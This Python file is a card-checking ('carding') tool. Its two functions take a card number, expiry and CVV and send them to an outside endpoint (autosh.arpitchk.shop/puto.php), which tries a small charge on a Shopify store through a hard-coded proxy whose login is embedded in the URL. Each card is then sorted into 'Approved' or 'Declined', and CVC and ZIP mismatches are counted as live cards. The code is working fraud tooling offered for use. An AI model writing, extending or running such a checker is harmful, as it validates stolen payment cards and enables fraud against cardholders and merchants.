"""
Shopify Gateway - Using actual working API
"""
import aiohttp
import asyncio
import json
import re

async def shopify_check(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Shopify $0.98 charge using real API endpoint
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str, 'gateway': str, 'price': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint from gatesbot
    api_url = (
        f"https://autosh.arpitchk.shop/puto.php"
        f"?site=https://jovs.com"
        f"&cc={full_card}"
        f"&proxy=198.23.239.134:6540:glesrjme:9snocgjv0sd3"
    )
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=50)
            ) as resp:
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    return {
                        'status': 'Unknown',
                        'response': 'Invalid API Response',
                        'gateway': 'Shopify',
                        'price': '$0.98'
                    }
                
                # Extract data
                response = data.get("Response", "Unknown")
                gateway = data.get("Gateway", "Stripe")
                price = data.get("Price", "1$")
                
                # Determine status
                lower_resp = response.lower()
                if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
                    status = "Approved"
                elif "3D_AUTHENTICATION" in response.upper():
                    status = "Approved"
                elif "INCORRECT_CVC" in response.upper():
                    status = "Approved"
                elif "INCORRECT_ZIP" in response.upper():
                    status = "Approved"
                elif "CARD_DECLINED" in response.upper():
                    status = "Declined"
                else:
                    status = "Declined"
                
                return {
                    'status': status,
                    'response': response,
                    'gateway': gateway,
                    'price': price
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out',
            'gateway': 'Shopify',
            'price': '$0.98'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'API request failed: {str(e)}',
            'gateway': 'Shopify',
            'price': '$0.98'
        }


async def shopify_auto_check(cc: str, mm: str, yy: str, cvv: str, site: str = "https://jovs.com") -> dict:
    """
    Auto Shopify with custom site
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
        site: Shopify site URL
    
    Returns:
        dict: {'status': str, 'response': str, 'gateway': str, 'price': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = (
        f"https://autosh.arpitchk.shop/puto.php"
        f"?site={site}"
        f"&cc={full_card}"
        f"&proxy=198.23.239.134:6540:glesrjme:9snocgjv0sd3"
    )
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=50)
            ) as resp:
                api_response = await resp.text()
                
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    return {
                        'status': 'Unknown',
                        'response': 'Invalid API Response',
                        'gateway': 'Auto Shopify',
                        'price': 'Variable'
                    }
                
                response = data.get("Response", "Unknown")
                gateway = data.get("Gateway", "Shopify")
                price = data.get("Price", "Variable")
                
                # Determine status
                if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
                    status = "Approved"
                elif "3D_AUTHENTICATION" in response.upper() or "INCORRECT_CVC" in response.upper() or "INCORRECT_ZIP" in response.upper():
                    status = "Approved"
                elif "CARD_DECLINED" in response.upper():
                    status = "Declined"
                else:
                    status = "Declined"
                
                return {
                    'status': status,
                    'response': response,
                    'gateway': gateway,
                    'price': price
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out',
            'gateway': 'Auto Shopify',
            'price': 'Variable'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'API request failed: {str(e)}',
            'gateway': 'Auto Shopify',
            'price': 'Variable'
        }
